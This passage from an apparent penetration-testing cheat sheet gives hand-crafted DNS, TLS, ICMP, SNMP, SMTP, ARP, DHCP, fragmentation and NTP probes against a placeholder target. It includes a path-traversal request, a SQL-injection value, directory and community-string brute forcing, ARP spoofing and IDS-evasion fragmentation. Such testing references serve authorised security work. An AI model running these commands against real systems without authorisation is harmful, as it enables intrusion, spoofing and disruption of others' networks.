# a malformed or non-standard request line, typed by hand over a raw socket
# (curl won't send a broken request line; this will)
printf 'GET /%%2e%%2e/ HTTP/1.1\r\nHost: [Target_IP]\r\nConnection: close\r\n\r\n' | \
  timeout 2 bash -c 'cat > /dev/tcp/[Target_IP]/80; cat < /dev/tcp/[Target_IP]/80'

# directory/file brute-force, wordlist + bash loop, no ffuf/gobuster needed
while read -r word; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://[Target_IP]/$word")
  [ "$code" != "404" ] && echo "$code $word"
done < wordlist.txt

# parameter tampering — sweep a list of param values against one endpoint
for val in "1" "0" "-1" "true" "admin" "' OR '1'='1"; do
  echo -n "$val -> "; curl -s -o /dev/null -w '%{http_code}\n' "http://[Target_IP]/item?id=$val"
done

# filter noisy results by response size instead of status code (catches soft-404s)
for word in $(cat wordlist.txt); do
  len=$(curl -s -o /dev/null -w '%{size_download}' "http://[Target_IP]/$word")
  echo "$len $word"
done | sort -n | uniq -c -f1 | sort -rn | head   # outliers = real hits

# full manual control over every byte, stdlib only
python3 -c "
import socket
s = socket.create_connection(('[Target_IP]', 80), timeout=3)
s.sendall(b'GET / HTTP/1.1\r\nHost: [Target_IP]\r\nUser-Agent: custom\r\nConnection: close\r\n\r\n')
print(s.recv(4096).decode(errors='replace'))"
```

<br />


## 40. Crafting Custom DNS Queries {#ch40-crafting-custom-dns-queries}

<p class="lead mb-4">Specific record types and resolvers, zone-transfer attempts, and OSINT pulls via public APIs — all via <code>curl</code>/<code>dig</code>/<code>whois</code>, nothing extra installed.</p>

```bash
# specific record type, specific resolver, no recursion
dig @[Target_IP] example.com AAAA +norecurse
dig @[Target_IP] example.com ANY +noall +answer

# EDNS buffer size / DNSSEC flags
dig @[Target_IP] example.com +dnssec +bufsize=4096

# a crafted zone transfer attempt (works only if the server is misconfigured to allow it)
dig @[Target_IP] example.com AXFR

# --- OSINT / recon, all via curl + public APIs, no installed tool beyond curl ---

# certificate transparency logs — every cert ever issued for a domain, including forgotten subdomains
curl -s "https://crt.sh/?q=%.example.com&output=json" | python3 -c "import json,sys; print('\n'.join(sorted(set(e['name_value'] for e in json.load(sys.stdin)))))"

# WHOIS — registrar, creation/expiry date, name servers
whois example.com

# Wayback Machine — every archived URL path under a domain, useful for finding old/forgotten endpoints
curl -s "http://web.archive.org/cdx/search/cdx?url=example.com/*&output=text&fl=original&collapse=urlkey" | head -50

# ASN / IP ownership block for a target
whois [Target_IP] | grep -Ei 'orgname|netrange|cidr'

# raw query with no dig/host present — just the resolver port, stdlib only
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# minimal manually-built DNS query for example.com A record
query = bytes.fromhex('aaaa01000001000000000000') + \
  b'\\x07example\\x03com\\x00' + bytes.fromhex('00010001')
s.sendto(query, ('[Target_IP]', 53))
print(s.recv(512))"
```

<br />


## 41. TLS/Cipher Probing & Custom Handshakes {#ch41-tls-cipher-probing-custom-handshakes}

<p class="lead mb-4">Forcing specific protocol versions and weak ciphers, dumping the cert chain, and speaking raw HTTP over an established TLS session.</p>

```bash
# which protocol versions/ciphers does this server actually accept?
openssl s_client -connect [Target_IP]:443 -tls1_2
openssl s_client -connect [Target_IP]:443 -tls1_3
openssl s_client -connect [Target_IP]:443 -ssl3 2>&1 | head -5   # should fail — if it succeeds, that's a finding

# force a specific weak cipher to see if it's still accepted
openssl s_client -connect [Target_IP]:443 -cipher 'RC4-SHA'

# dump the full cert chain and key details
openssl s_client -connect [Target_IP]:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text

# manually speak HTTP over an established TLS session
openssl s_client -connect [Target_IP]:443 -quiet <<EOF
GET / HTTP/1.1
Host: [Target_IP]
Connection: close

EOF

# SNI mismatch test — request one cert while presenting a different Host
openssl s_client -connect [Target_IP]:443 -servername wrong.example.com
```

<br />


## 42. ICMP Payload Crafting & Ping Tuning {#ch42-icmp-payload-crafting-ping-tuning}

<p class="lead mb-4">Custom payload patterns, oversized packets, and a fully custom ICMP echo via stdlib sockets.</p>

```bash
# custom payload pattern — up to 16 hex bytes, useful for covert-channel/IDS-signature testing
ping -p 'deadbeef' -c 3 [Target_IP]

# custom packet size (MTU/fragmentation testing)
ping -s 1472 -M do -c 2 [Target_IP]        # -M do = don't fragment
ping -s 65500 [Target_IP]                   # oversized — classic ping-of-death territory, lab only

# custom TTL and interval
ping -t 5 -i 0.2 -c 10 [Target_IP]

# fully custom ICMP via stdlib — type/code/payload all yours
python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
payload = struct.pack('!BBHHH', 8, 0, 0, 1, 1) + b'custom-data'
checksum = sum(struct.unpack('!%dH' % (len(payload)//2), payload[:len(payload)//2*2])) & 0xffff
packet = struct.pack('!BBHHH', 8, 0, (~checksum) & 0xffff, 1, 1) + b'custom-data'
s.sendto(packet, ('[Target_IP]', 0))"
```

<br />


## 43. Custom SNMP Queries {#ch43-custom-snmp-queries}

<p class="lead mb-4">Walks vs. targeted gets, SNMPv3 auth/priv, a crafted SET, and a quick community-string brute.</p>

```bash
# walk vs targeted get — scope how much you pull
snmpwalk -v2c -c public [Target_IP]                       # entire MIB tree
snmpget -v2c -c public [Target_IP] sysDescr.0              # one OID

# SNMPv3 with auth/priv (community strings are v1/v2c only)
snmpget -v3 -u admin -l authPriv -a SHA -A authpass -x AES -X privpass [Target_IP] sysDescr.0

# a crafted SET — only works if write access via that community is misconfigured (lab only, can change device config)
snmpset -v2c -c private [Target_IP] sysContact.0 s "test-contact"

# brute a short list of common community strings
for c in public private manager admin; do
  echo -n "$c: "; snmpget -v2c -c $c -t 1 -r 0 [Target_IP] sysDescr.0 2>/dev/null || echo "no response"
done
```

<br />


## 44. Syslog Message Crafting — logger {#ch44-syslog-message-crafting}

<p class="lead mb-4"><code>logger</code> is native on virtually every Linux box and lets you emit arbitrary syslog messages — genuinely useful for testing a log pipeline end-to-end (does it reach your SIEM, is the facility/severity mapped right) without waiting for a real event.</p>

```bash
# simplest custom message, default facility/severity
logger "test message from $(hostname)"

# specific facility.severity — confirm your SIEM routes auth events correctly
logger -p auth.warning "TEST: simulated failed login event"
logger -p local0.crit "TEST: simulated critical app event"

# send straight to a remote syslog collector over UDP, bypassing local rsyslog config
logger -n [Target_IP] -P 514 -d "TEST: direct UDP syslog message"

# custom tag/PID, so it's easy to filter out your own test traffic later
logger -t MYTEST -p local0.info "synthetic event for pipeline validation"
```

<br />


## 45. Raw Ethernet Frame Crafting (AF_PACKET, stdlib) {#ch45-raw-ethernet-frame-crafting}

<p class="lead mb-4">Linux's <code>socket.AF_PACKET</code> is standard library — lets you build a frame from the Ethernet header up, no scapy needed. Needs root, and only works on Linux (not macOS/Windows).</p>

```python
#!/usr/bin/env python3
# craft a raw Ethernet frame with a custom EtherType and payload
import socket, struct

IFACE = "eth0"
dst_mac = bytes.fromhex("ffffffffffff")       # broadcast; swap for a specific MAC
src_mac = bytes.fromhex("001122334455")        # your interface's MAC — get it with: ip link show eth0
ethertype = struct.pack("!H", 0x88B5)           # 0x88B5 = IEEE Std 802 Local Experimental; use what fits your test
payload = b"custom raw frame payload"

frame = dst_mac + src_mac + ethertype + payload

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((IFACE, 0))
s.send(frame)
```

```bash
# sniff raw frames back with the same socket family — confirm what actually went on the wire
python3 -c "
import socket
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
s.bind(('eth0', 0))
print(s.recvfrom(2048))"
```

<br />


## 46. Manual SMTP Protocol Crafting {#ch46-manual-smtp-protocol-crafting}

<p class="lead mb-4">Typing SMTP commands by hand over a raw connection — tests open relay config, VRFY/EXPN user enumeration, and STARTTLS downgrade behavior directly.</p>

```bash
# connect and watch the banner (often leaks exact MTA version)
bash -c 'exec 3<>/dev/tcp/[Target_IP]/25; cat <&3 & printf "EHLO test.local\r\nQUIT\r\n" >&3; sleep 1'

# full manual conversation with netcat-equivalent via bash, step by step
python3 - <<'EOF'
import socket
s = socket.create_connection(('[Target_IP]', 25), timeout=5)
print(s.recv(1024).decode())

for cmd in [
    'EHLO test.local\r\n',
    'MAIL FROM:<test@test.local>\r\n',
    'RCPT TO:<someone@example.com>\r\n',   # relay test — should be refused for external addresses on a properly configured MTA
    'VRFY root\r\n',                        # user enumeration — should be disabled
    'QUIT\r\n',
]:
    s.sendall(cmd.encode())
    print(s.recv(1024).decode())
EOF
```

<br />


## 47. ARP Crafting & Spoofing Detection {#ch47-arp-crafting-spoofing-detection}

<p class="lead mb-4">Gratuitous ARP via scapy, and the signature that reveals spoofing on your own segment — one IP mapping to multiple MACs over time.</p>

```bash
# native: ARP request/reply timing
arping -c 3 [Target_IP]

# scapy — gratuitous ARP (unsolicited IP->MAC announcement)
python3 -c "
from scapy.all import ARP, Ether, sendp
pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, psrc='[Target_IP]', hwsrc='00:11:22:33:44:55', pdst='[Target_IP]')
sendp(pkt, iface='eth0', verbose=0)"

# detect ARP spoofing on your own segment — one IP mapping to multiple MACs over time is the signature
ip -s neigh show
watch -n1 'ip neigh show | sort'
tcpdump -i eth0 -nn arp
```

<br />


## 48. IPv6 / ICMPv6 Crafting {#ch48-ipv6-icmpv6-crafting}

<p class="lead mb-4">Native <code>ping6</code>, neighbor discovery (IPv6's ARP equivalent), router solicitation, and raw ICMPv6 echo via stdlib.</p>

```bash
# native ping6
ping -6 -c 3 [Target_IPv6]
ping6 -c 3 -s 1452 [Target_IPv6]              # IPv6 path MTU testing (1280 min, 1500 typical)

# neighbor discovery — IPv6's ARP equivalent
ip -6 neigh show

# router solicitation — ask every router on the link to announce itself
python3 -c "
from scapy.all import IPv6, ICMPv6ND_RS, send
send(IPv6(dst='ff02::2')/ICMPv6ND_RS(), verbose=0)"

# raw ICMPv6 echo with custom payload, stdlib
python3 -c "
import socket
s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
s.sendto(b'\x80\x00\x00\x00\x00\x01\x00\x01custom', ('[Target_IPv6]', 0))"
```

<br />


## 49. DHCP Crafting {#ch49-dhcp-crafting}

<p class="lead mb-4">Crafting a DHCP DISCOVER with scapy, watching what a server offers without consuming a lease, and a rogue-DHCP audit.</p>

```bash
# craft a DHCP DISCOVER — scapy makes this far less painful than raw sockets
python3 -c "
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(sport=68, dport=67)/ \
  BOOTP(chaddr=b'\x00\x11\x22\x33\x44\x55')/DHCP(options=[('message-type','discover'), 'end'])
sendp(pkt, iface='eth0', verbose=0)"

# watch what a DHCP server offers, without consuming a lease
tcpdump -i eth0 -nn 'udp port 67 or udp port 68'

# rogue-DHCP audit — is more than one server answering on this segment?
sudo nmap --script broadcast-dhcp-discover 2>/dev/null
```

<br />


## 50. Fragmentation & Checksum Evasion Testing {#ch50-fragmentation-checksum-evasion-testing}

<p class="lead mb-4">Manual fragmentation and invalid checksums to test how an IDS/firewall reassembles — or fails to.</p>

```bash
# manual fragmentation — tests how an IDS/firewall reassembles (or fails to)
python3 -c "
from scapy.all import IP, TCP, fragment, send
pkt = IP(dst='[Target_IP]')/TCP(dport=80, flags='S')/('A'*100)
for f in fragment(pkt, fragsize=24): send(f, verbose=0)"

# deliberately invalid checksum — many stacks silently drop, some don't; useful signal either way
python3 -c "
from scapy.all import IP, TCP, send
send(IP(dst='[Target_IP]')/TCP(dport=80, flags='S', chksum=0x1234), verbose=0)"

# overlapping/more-fragments flag via hping3 — classic evasion pattern, heavily signatured by modern IDS
hping3 -S -p 80 -x [Target_IP]
```

<br />


## 51. NTP Crafting {#ch51-ntp-crafting}

<p class="lead mb-4">Basic queries, checking whether the legacy <code>monlist</code> reflection/amplification vector is still enabled, and a raw stdlib NTP query.</p>

```bash
# basic query
ntpdate -q [Target_IP] 2>/dev/null
ntpq -p [Target_IP] 2>/dev/null

# is monlist still enabled? historically abused for reflection/amplification — should return nothing
ntpdc -c monlist [Target_IP] 2>/dev/null

# raw NTP query, stdlib only
python3 -c "
import socket
data = b'\x1b' + 47*b'\0'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(data, ('[Target_IP]', 123))
print(s.recv(48))"
```

<br />
